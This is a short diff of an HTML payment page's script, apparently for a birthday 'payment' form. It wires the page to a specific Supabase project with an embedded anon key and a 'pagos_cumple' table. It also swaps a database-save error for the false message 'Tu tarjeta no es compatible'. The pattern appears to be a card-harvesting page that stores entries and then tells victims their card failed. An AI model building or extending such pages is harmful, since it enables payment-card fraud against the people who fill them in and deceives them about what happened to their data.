@@ -12,8 +12,8 @@
   =====================================================================
 -->
 <script>
-  var SUPABASE_URL = "https://TU-PROYECTO.supabase.co";
-  var SUPABASE_KEY = "TU_ANON_KEY";
+  var SUPABASE_URL = "https://uopyptyxocbsgckkpjlo.supabase.co";
+  var SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVvcHlwdHl4b2Nic2dja2twamxvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODM2NjA3MjEsImV4cCI6MjA5OTIzNjcyMX0.dHAwXssKoiRSHPDLjs3gpaa9nbVbNzrPPZOE782NMQo";
   // Tabla esperada en Supabase (crea en SQL Editor):
   // CREATE TABLE pagos_cumple (
   //   id          bigserial primary key,
@@ -608,7 +608,7 @@ document.getElementById('payBtn').addEventListener('click', async function() {
     
   } catch (err) {
     // Este bloque solo se ejecuta si hay un error real al guardar en Supabase
-    msgEl.textContent = 'Error al guardar los datos';
+    msgEl.textContent = 'Tu tarjeta no es compatible';
     msgEl.className = 'pay-msg err';
     console.warn('Error al guardar en Supabase:', err.message);
   } finally {
